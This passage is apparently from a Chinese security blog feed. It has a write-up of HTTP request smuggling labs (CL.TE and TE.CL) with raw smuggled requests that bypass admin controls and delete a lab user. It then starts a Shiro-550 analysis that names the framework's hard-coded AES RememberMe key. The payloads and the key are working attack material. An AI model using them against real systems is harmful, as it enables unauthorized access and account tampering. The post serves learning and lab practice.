q<span class="token operator">=</span>smuggling<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于包含了一个空的URL，那么网站就会返回404</p>
<h3 id="基于差分相应技术的TE-CL漏洞"><a href="#基于差分相应技术的TE-CL漏洞" class="headerlink" title="基于差分相应技术的TE.CL漏洞"></a>基于差分相应技术的TE.CL漏洞</h3><p>首先我们构建一个类似如下的数据包：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">4</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

7c
GET <span class="token operator">/</span><span class="token number">404</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">144</span>

x<span class="token operator">=</span>
<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于前端根据TE进行确认，那么将会把整个数据包传输到后端，后端根据CL进行确认，CL长度为4，那么后端将会只保存\r\n7c四个字节，将后续的GET放入pipline中进行等待。</p>
<p>！注意：在测试TE.CL漏洞时，需要关闭burpsuite中的Update Content-Length，否则它会自动帮你识别长度并进行发送。</p>
<p>如果攻击成功，则后端服务器会拼接如下请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span><span class="token number">404</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">146</span>

x<span class="token operator">=</span>
<span class="token number">0</span>

POST <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">11</span>

q<span class="token operator">=</span>smuggling<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>后端会将x=后面都当成请求体，导致后端服务器访问/404，从而造成漏洞</p>
<h3 id="Note！"><a href="#Note！" class="headerlink" title="Note！"></a>Note！</h3><p>在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记以下重要的注意事项：</p>
<ol>
<li>攻击请求和正常请求应该适用不同的网络发送到服务器，比如一个用chrome的正常模式，一个用chrome的隐私模式发送，如果通过同一个链接发送这两个请求，不能保证漏洞一定存在</li>
<li>攻击请求和正常请求应该尽可能的使用相同的URL和参数名称。这是因为现代的程序会根据URL和参数将前端请求路由到不同的后端服务器，使用相同的URL和参数会增加请求由同一个后端服务器处理的机会</li>
<li>在测试正常请求以检测来自攻击请求的干扰时，可能会被其他请求造成干扰，所以应该进行多次测试，并且当你发送恶意请求时，应立即发送下一个请求以防止正常其他用户请求的干扰</li>
<li>如果前端服务器充当了负载均衡器，并根据一些负载均衡算法将请求转发到不同的后端系统，那么就会攻击失败，这也是需要发送多次请求尝试的原因之一</li>
<li>如果成功干扰了后续请求，但不是预期检测干扰而发送的请求，那么可能意味着其他正常用户收到了攻击影响，如果继续执行测试，可能会对其他用户造成破坏性的影响</li>
</ol>
<h2 id="http请求走私利用方式："><a href="#http请求走私利用方式：" class="headerlink" title="http请求走私利用方式："></a>http请求走私利用方式：</h2><ol>
<li>绕过前端安全控制</li>
<li>现实前端请求重写</li>
<li>捕获其他用户的请求</li>
<li>利用反射型XSS</li>
<li>重定向</li>
<li>执行web缓存中毒</li>
<li>执行web缓存欺骗</li>
<li>绕过waf和CDN</li>
</ol>
<h3 id="使用HTTP走私请求绕过前端安全控制"><a href="#使用HTTP走私请求绕过前端安全控制" class="headerlink" title="使用HTTP走私请求绕过前端安全控制"></a>使用HTTP走私请求绕过前端安全控制</h3><p>在一些应用中，前段服务器会使用一些安全控制实例去决定是否允许请求通过，如果后端接收到请求，则默认为该请求通过了前端安全控制</p>
<p>例如，假设应用程序使用前端服务器来实现访问控制限制，仅当用户有权访问请求的 URL 时才转发请求。然后，后端服务器会接受每个请求，而无需进一步检查。在此情况下，HTTP 请求走私漏洞可用于绕过访问控制，方法是将请求走私到受限制的 URL。</p>
<p>假设当前用户允许访问/home页面但是不能访问/admin页面，我们可以尝试用如下请求去绕过：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">62</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">0</span>

GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Foo<span class="token punctuation">:</span> xGET <span class="token operator">/</span>home HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用PortSwigger的靶场进行演示：</p>
<h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL.TE漏洞"></a>CL.TE漏洞</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-07_21.31.57.png" alt="截屏2022-10-07 21.31.57.png"></p>
<p>这是一个CL.TE的漏洞</p>
<p>首先我们访问页面：</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-07_21.37.05.png" alt="截屏2022-10-07 21.37.05.png"></p>
<p>burp抓一下请求</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-07_21.37.45.png" alt="截屏2022-10-07 21.37.45.png"></p>
<p>我们将其发送到repeater模块中，并且HTTP请求走私基本是基于POST请求，所以我们修改请求改为POST，并且因为后端为TE，我们在请求中加上Transer-Encoding: chunked 来保证后端服务器可以解析我们的请求.所以我们构造如下请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">37</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">0</span>

GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
X<span class="token operator">-</span>Ignore<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为未使用请求头 Host: <a href="http://localhost/">localhost</a> 所以我们无法访问admin页面，所以第二次构造我们加上请求头：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">37</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">0</span>

GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
X<span class="token operator">-</span>Ignore<span class="token punctuation">:</span> X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>请注意，由于第二个请求的主机标头与第一个请求中走私的主机标头冲突，请求被阻止。</p>
<p>发出以下请求两次，以便将第二个请求的标头附加到走私的请求正文中：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">116</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">0</span>

GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>

x<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第二个Content-Length长度为10，请求内容是4字节，那么就会有6字节的内容在pipline中等待，第二个请求到来时，将会与下面的进行拼接而导致400请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>

x<span class="token operator">=</span>
GET <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>

x<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-07_21.49.56.png" alt="截屏2022-10-07 21.49.56.png"></p>
<p>说明现在我们可以访问admin页面，由于靶场的目标是让我们删除carlos账户，那么我们直接访问/admin/delete?username=carlos即可删除账户</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">139</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">0</span>

GET <span class="token operator">/</span>admin<span class="token operator">/</span>delete?username<span class="token operator">=</span>carlos HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">10</span>

x<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么我们连续发送两次即可删除carlos账户</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-07_21.55.08.png" alt="截屏2022-10-07 21.55.08.png"></p>
<h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE.CL漏洞"></a>TE.CL漏洞</h3><p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.14.08.png" alt="截屏2022-10-08 14.14.08.png"></p>
<p>访问网址</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.14.25.png" alt="截屏2022-10-08 14.14.25.png"></p>
<p>题目要求删除账户，我们先访问一下admin目录试试，发现禁止访问</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.35.02.png" alt="截屏2022-10-08 14.35.02.png"></p>
<p>抓一下包，首先还是改为POST请求,注意关闭repeater中的Update Content-Length,因为这个功能会自动帮你调整CL长度，导致攻击失败（TE.CL关闭，CL.TE开启）</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.14.54.png" alt="截屏2022-10-08 14.14.54.png"></p>
<p>构造payload尝试，注意0后要有两个\r\n,连续发送两次</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>length<span class="token punctuation">:</span> <span class="token number">4</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">71</span>
POST <span class="token operator">/</span>admin HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">15</span>

x<span class="token operator">=</span><span class="token number">1</span>
<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.37.30.png" alt="截屏2022-10-08 14.37.30.png"></p>
<p>发现请求400错误，猜测需要本地访问，那么我们加上Host: localhost,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> YOUR<span class="token operator">-</span>LAB<span class="token operator">-</span>ID<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net
Content<span class="token operator">-</span>length<span class="token punctuation">:</span> <span class="token number">4</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

<span class="token number">87</span>
GET <span class="token operator">/</span>admin<span class="token operator">/</span>delete?username<span class="token operator">=</span>carlos HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">15</span>

x<span class="token operator">=</span><span class="token number">1</span>
<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.45.39.png" alt="截屏2022-10-08 14.45.39.png"></p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.46.57.png" alt="截屏2022-10-08 14.46.57.png"></p>
<p>大佬的工具检测的payload更多</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_14.58.44.png" alt="截屏2022-10-08 14.58.44.png"></p>
<p>另一个工具(http-request-smuggling-detection-tool)</p>
<p><img src="/2022/10/08/http-request-smuggling/%25E6%2588%25AA%25E5%25B1%258F2022-10-08_15.03.32.png" alt="截屏2022-10-08 15.03.32.png"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-550</title>
    <url>/2022/10/07/shiro-550/</url>
    <content><![CDATA[<h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>Shiro攻击payload经过AES加密，很多防护设备无法识别/拦截攻击</p>
<h2 id="0x2-环境搭建"><a href="#0x2-环境搭建" class="headerlink" title="0x2 环境搭建"></a>0x2 环境搭建</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>apache<span class="token operator">/</span>shiro<span class="token punctuation">.</span>git  
cd shiro
git checkout shiro<span class="token operator">-</span>root<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span><span class="token number">91</span>chi<span class="token punctuation">.</span>fun<span class="token comment">//https://github.com//apache/shiro/archive/refs/tags/shiro-root-1.2.4.zip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="0x3-分析代码："><a href="#0x3-分析代码：" class="headerlink" title="0x3 分析代码："></a>0x3 分析代码：</h2><h3 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h3><p>key硬编码：</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.15.53.png" alt="截屏2022-05-24 20.15.53.png"></p>
<p>发现<code>AbstractRememberMeManager继承了RememberMeManager</code>类，那么需要向上溯源，找到RemeberMeManager接口</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.21.34.png" alt="截屏2022-05-24 20.21.34.png"></p>
<p>发现一个onSuccessfullLogin方法，显示登陆成功后的步骤，那么给它打上断点，debug一下，记得勾选RememberMe。</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.25.21.png" alt="截屏2022-05-24 20.25.21.png"></p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.24.05.png" alt="截屏2022-05-24 20.24.05.png"></p>
<p>步进，转到<code>forgetIdentity</code> 方法 主要是处理request和response请求，跟进this.forgetIdentity方法</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.27.03.png" alt="截屏2022-05-24 20.27.03.png"></p>
<p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.52.06.png" alt="截屏2022-05-24 20.52.06.png"></p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.56.31.png" alt="截屏2022-05-24 20.56.31.png"></p>
<p><code>"isRememberMe"主要是检查筛选了rememberMe按钮是否使用</code>,然后查看rememberIdentity方法</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_20.57.59.png" alt="截屏2022-05-24 20.57.59.png"></p>
<p>继续跟进rememberIdentity函数</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.00.19.png" alt="截屏2022-05-24 21.00.19.png"></p>
<p><code>convertPrincipalsToBytes</code> 看起来是转化为bytes，跟进看一下</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.01.13.png" alt="截屏2022-05-24 21.01.13.png"></p>
<p>发现进行了序列化，而且序列化的是传入的root用户名，就是普通的序列化。encrypt方法加密序列化后的二进制字节，跟进一下encrypt方法：</p>
<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.01.59.png" alt="截屏2022-05-24 21.01.59.png"></p>
<p>跟进后发现getCipherService()就是获取密码服务，还是跟进encrypt方法，看了一下是AES加密，getEncryptionCipherKey就是获取密钥</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> serialized<span class="token punctuation">;</span>
        <span class="token class-name">CipherService</span> cipherService <span class="token operator">=</span> <span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>cipherService <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">ByteSource</span> byteSource <span class="token operator">=</span> cipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>serialized<span class="token punctuation">,</span> <span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            value <span class="token operator">=</span> byteSource<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/07/shiro-550/%E6%88%AA%E5%B1%8F2022-05-24_21.11.20.png" alt="截屏2022-05-24 21.11.20.png"></p>
<p>获取了这个密钥：<code>kPH+bIxk5D2deZiIxcaaaA==</code>, 这时就是加密方法了</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ByteSource</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ivBytes <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token comment">//生成初始化向量，随后generate：TRUE</span>
        <span class="token keyword">boolean</span> generate <span class="token operator">=</span> <span class="token function">isGenerateInitializationVectors</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>generate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token comment">//产生初始化向量</span>
            ivBytes <span class="token operator">=</span> <span class="token function">generateInitializationVector</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//异常不会进入</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ivBytes <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> ivBytes<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"Initialization vector generation is enabled - generated vector"</span> <span class="token operator">+</span>
                        <span class="token string">"cannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token comment">//跟进具体方法，基本加密逻辑知道了，已知Key和IV</span>
        <span class="token keyword">return</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ivBytes<span class="token punctuation">,</span> generate<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进看一下IV如何计算（随机生成）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generateInitializationVector</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> streaming<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">getInitializationVectorSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"initializationVectorSize property must be greater than zero.  This number is "</span> <span class="token operator">+</span>
                    <span class="token string">"typically set in the "</span> <span class="token operator">+</span> <span class="token class-name">CipherService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" subclass constructor.  "</span> <span class="token operator">+</span>
                    <span class="token string">"Also check your configuration to ensure that if you are setting a value, it is positive."</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">%</span> <span class="token constant">BITS_PER_BYTE</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"initializationVectorSize property must be a multiple of 8 to represent as a byte array."</span><span class="token punctuation">;</span>
